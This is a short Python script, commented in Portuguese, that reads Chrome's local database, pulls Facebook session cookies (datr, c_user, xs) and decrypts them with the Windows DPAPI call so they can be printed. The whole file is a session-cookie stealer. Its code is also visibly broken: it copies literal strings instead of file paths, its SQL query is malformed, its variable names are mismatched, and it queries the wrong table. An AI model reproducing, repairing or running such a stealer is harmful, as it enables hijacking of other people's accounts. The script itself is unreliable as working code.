import os, sqlite3, shutil, win32crypt  ###import das bibliotecas que serão precisas

banco =os.getenv("LOCALAPPDATA") + \  ###Pega as variaveis de ambientes que geralmente onde ficam aramazenadas as senhas
    "\\Google\\Chrome\\User Data\\Default\\Login Data"
banco2 = banco + "2" ###uma variável recebe o conteúdo va outra variavel banco
shutil.copyfile("banco", "banco2") #copia a variável os dados do banco principal para o banco2, para que os processos que estão lendo esses arquivos não seja atingido
conexao=sqlite3.connect(banco)#cria uma conexao com banco sqlite3
consulta=conexao.cursor()#faz um cursor pegando a conexao
comando="select name, encrypted_value from cookies whers host_keys='.facebook.com' and (name='datr' or name='c_user' or name='xs'"#da tabela logins vai pegar esses usuários
consulta.execute(comando)
for name, valor in consulta.fetchall():#faz um cursor pegando os dados de nome, valor
    valor = win32crypt.CryptUnprotectData(valor)
    print (nome +"-"+valor[1].decode("ISO-8859-1") + "\n")
    conexao.close()#Fecha a conexão
os.remove(banco2)#deletar o banco2